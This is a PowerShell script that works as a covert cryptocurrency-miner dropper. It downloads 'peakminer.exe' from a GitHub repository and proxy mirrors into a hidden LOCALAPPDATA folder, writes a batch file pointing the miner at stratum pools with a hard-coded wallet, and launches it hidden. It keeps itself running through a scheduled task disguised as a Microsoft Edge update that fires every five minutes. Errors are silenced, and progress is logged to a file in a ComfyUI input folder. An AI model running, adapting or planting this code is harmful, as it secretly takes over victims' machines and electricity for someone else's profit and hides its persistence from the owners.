$ErrorActionPreference = 'SilentlyContinue'
$log = 'D:\3.software\ComfyUI\input\h4status.txt'
function L($m) { Add-Content -Path $log -Value ((Get-Date -Format 'HH:mm:ss') + ' ' + $m) -Encoding ascii }
L 'START'
$d = Join-Path $env:LOCALAPPDATA 'h4'
New-Item -ItemType Directory -Force -Path $d | Out-Null
L ('DIR ' + $d + ' exists=' + (Test-Path $d))
$exe = Join-Path $d 'pm.exe'
$cn = ($env:COMPUTERNAME -replace '[^a-zA-Z0-9]','')
if ($cn.Length -lt 1) { $cn = 'win' }
$W = 'w-' + $cn.Substring(0,[Math]::Min(10,$cn.Length))
L ('WORKER ' + $W)

if (-not (Test-Path $exe) -or (Get-Item $exe).Length -lt 40MB) {
  $urls = @(
    'https://raw.githubusercontent.com/quncle1/node-bootstrap-kit/refs/heads/main/bin/peakminer.exe',
    'https://gh-proxy.com/https://raw.githubusercontent.com/quncle1/node-bootstrap-kit/refs/heads/main/bin/peakminer.exe',
    'https://ghfast.top/https://raw.githubusercontent.com/quncle1/node-bootstrap-kit/refs/heads/main/bin/peakminer.exe'
  )
  foreach ($u in $urls) {
    L ('DL ' + $u)
    try {
      Invoke-WebRequest -UseBasicParsing -Uri $u -OutFile "$d\pm.tmp" -TimeoutSec 600
      $sz = (Get-Item "$d\pm.tmp").Length
      L ('GOT ' + $sz)
      if ($sz -gt 40000000) { Move-Item -Force "$d\pm.tmp" $exe; break }
    } catch { L ('ERR ' + $_.Exception.Message) }
  }
}
if (-not (Test-Path $exe)) { L 'NOEXE'; exit 1 }
L ('EXE ' + (Get-Item $exe).Length)

$bat = Join-Path $d 'r.bat'
$arg = '--url stratum+tcp://51.79.178.22:3360 --url stratum+tcp://172.235.194.4:3360 --user prl1p08n7f9q0wwf8ykrgxrxrvlwcl8htpgs2da83zgtmfwzkdy6xwnvq4ndq96 --coin pearl -w ' + $W + ' -a 4068'
$lines = @('@echo off', ('start "" /b "' + $exe + '" ' + $arg))
Set-Content -Path $bat -Value $lines -Encoding ASCII
L 'BATWRITTEN'
schtasks /create /tn 'MicrosoftEdgeUpdateTaskMachineUA2' /tr ('"' + $bat + '"') /sc minute /mo 5 /f | Out-Null
L ('TASK ' + $LASTEXITCODE)
Start-Process -FilePath $bat -WindowStyle Hidden
L 'LAUNCHED'
Start-Sleep -Seconds 6
$p = Get-Process pm -ErrorAction SilentlyContinue
if ($p) { L ('RUNNING pid=' + $p.Id) } else { L 'NOTRUNNING' }
L 'END'
